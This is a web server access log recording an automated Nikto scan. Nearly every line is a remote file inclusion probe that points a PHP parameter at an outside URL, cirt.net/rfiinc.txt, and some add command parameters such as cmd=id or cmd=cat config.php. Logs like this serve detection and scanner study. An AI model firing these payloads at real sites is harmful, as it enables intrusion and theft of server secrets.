172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /search/submit.php?config[\\\"sipssys\\\"]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005772)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /search_wA.php?LIBPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005773)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /searchbot.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005774)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /security/include/_class.security.php?PHPSECURITYADMIN_PATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005775)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sendstudio/admin/includes/createemails.inc.php?ROOTDIR=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 537 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005776)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sendstudio/admin/includes/send_emails.inc.php?ROOTDIR=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 536 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005777)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /senetman/html/index.php?page=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005778)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /services.php?page=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005779)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /services/samples/inclusionService.php?CabronServiceFolder=http://cirt.net/rfiinc.txt?%00 HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005780)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /settings.php?P[includes]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005781)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /settings_sql.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005782)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /setup/inc/database.php?tcms_administer_site=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005783)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /setup/upgrader.php?RootDirectory=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005784)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sezhoo/SezHooTabsAndActions.php?IP=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005785)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /shop/includes/header.inc.php?dateiPfad=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005786)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /shop/index.php?action=http://cirt.net/rfiinc.txt??&cmd=cat%20config.php HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005787)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /shop/page.php?osCsid=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005788)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /shop/page.php?pageid=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005789)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /shoutbox.php?language=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005790)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /shoutbox.php?root=http://cirt.net/rfiinc.txt??cmd=id HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005791)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /show.php?file=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005792)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /show.php?id=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005793)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /show.php?page=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005794)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /show.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005795)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /show_archives.php?cutepath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005796)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sid=XXXXXXXXXXXXXXXXXXXXXXXXXXXX&shopid=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 561 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005797)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sid=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005798)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /signer/final.php?smiley=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005799)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /signin.php?sent=1&AMG_serverpath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005800)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sinagb.php?fuss=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005801)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sinapis.php?fuss=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005802)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sitebar/Integrator.php?file=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005803)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sitebar/index.php?writerFile=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005804)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sitebuilder/admin/top.php?admindir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005805)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sitemap.xml.php?dir[classes]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005806)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /skin/board/default/doctype.php?dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 485 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005807)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /skin/dark/template.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005808)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /skin/gold/template.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005809)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /skin/html/table.php?pachtofile=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005810)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /skin/original/template.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005811)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /skin_shop/standard/2_view_body/body_default.php?GOODS[no]=deadbeef&GOODS[gs_input]=deadbeef&shop_this_skin_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 538 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005812)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /skins/advanced/advanced1.php?pluginpath[0]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005813)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /skins/default.php?dir_inc=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005814)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /skins/header.php?ote_home=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005815)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /skins/phpchess/layout_admin_cfg.php?Root_Path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005816)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /skins/phpchess/layout_cfg.php?Root_Path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005817)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /skins/phpchess/layout_t_top.php?Root_Path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005818)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /skysilver/login.tpl.php?theme=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005819)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /slogin_lib.inc.php?slogin_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005820)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /slogin_lib.inc.php?slogin_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005821)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /smarty.php?xcart_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005822)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /smarty.php?xcart_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005823)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /smarty/smarty_class.php?_smarty_compile_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005824)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /smilies.php?config=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005825)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /snippetmaster/includes/tar_lib/pcltar.lib.php?g_pcltar_lib_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 536 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005826)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /snippetmaster/includes/tar_lib/pcltar.lib.php?g_pcltar_lib_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 536 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005827)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /snippetmaster/includes/vars.inc.php?_SESSION[SCRIPT_PATH]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005828)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /snippetmaster/includes/vars.inc.php?_SESSION[SCRIPT_PATH]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005829)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /snort/base_stat_common.php?BASE_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005830)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /social_game_play.php?path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005831)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /software_upload/public_includes/pub_templates/vphptree/template.php?vsDragonRootPath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 558 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005832)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /song.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005833)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /source.php?bibtexrootrel=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005834)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /source/mod/rss/channeledit.php?Codebase=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005835)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /source/mod/rss/post.php?Codebase=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005836)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /source/mod/rss/view.php?Codebase=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005837)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /source/mod/rss/viewitem.php?Codebase=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005838)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sources/Admin/admin_cats.php?CONFIG[main_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005839)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sources/Admin/admin_edit.php?CONFIG[main_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005840)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sources/Admin/admin_import.php?CONFIG[main_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005841)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sources/Admin/admin_templates.php?CONFIG[main_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005842)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sources/functions.php?CONFIG[main_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005843)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sources/help.php?CONFIG[main_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005844)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005845)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]=http://cirt.net/rfiinc.txt??cmd=ls HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005846)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sources/lostpw.php?FORM[set]=1&FORM[session_id]=1&CONFIG[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005847)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sources/mail.php?CONFIG[main_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005848)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sources/misc/new_day.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005849)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sources/news.php?CONFIG[main_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005850)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sources/post.php?fil_config=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005851)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sources/template.php?CONFIG[main_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005852)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sources/tourney/index.php?page=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005853)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /spaw/spaw_control.class.php?GLOBALS[spaw_root]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005854)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /spaw/spaw_control.class.php?spaw_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005855)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /speedberg/include/entrancePage.tpl.php?SPEEDBERG_PATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005856)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /speedberg/include/generalToolBox.tlb.php?SPEEDBERG_PATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005857)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /speedberg/include/myToolBox.tlb.php?SPEEDBERG_PATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005858)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /speedberg/include/scriplet.inc.php?SPEEDBERG_PATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005859)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /speedberg/include/simplePage.tpl.php?SPEEDBERG_PATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005860)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /speedberg/include/speedberg.class.php?SPEEDBERG_PATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005861)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /speedberg/include/standardPage.tpl.php?SPEEDBERG_PATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005862)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /spellcheckwindowframeset.php?SpellIncPath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005863)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /squirrelcart/cart_content.php?cart_isp_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005864)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /src/ark_inc.php?cfg_pear_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005865)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /src/browser/resource/categories/resource_categories_view.php?CLASSES_ROOT=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 551 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005866)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /src/scripture.php?pageHeaderFile=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005867)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /starnet/themes/c-sky/main.inc.php?cmsdir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005868)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /start.php?lang=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005869)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /start.php?pg=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005870)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /stat_modules/users_age/module.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005871)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /stats.php?vwar_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005872)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /stats.php?vwar_root=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005873)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /stphpapplication.php?STPHPLIB_DIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005874)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /stphpbtnimage.php?STPHPLIB_DIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005875)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /stphpform.php?STPHPLIB_DIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005876)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /str.php?p=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005877)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /streamline-1.0-beta4/src/core/theme/includes/account_footer.php?sl_theme_unix_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 554 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005878)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /streamline-1.0-beta4/src/core/theme/includes/account_footer.php?sl_theme_unix_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 554 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005879)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /strload.php?LangFile=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005880)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /studip-1.3.0-2/studip-htdocs/archiv_assi.php?cmd=ls -al&ABSOLUTE_PATH_STUDIP=http://cirt.net/rfiinc.txt??" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /studip-1.3.0-2/studip-phplib/oohforms.inc?cmd=ls -al&_PHPLIB[libdir]=http://cirt.net/rfiinc.txt??" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /styles.php?toroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005883)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /styles/default/global_header.php?installed=23&domain=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005884)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /submit_abuse.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005885)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /submit_comment.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005886)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /subscp.php?phpbb_root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005887)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /suite/index.php?pg=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005888)"
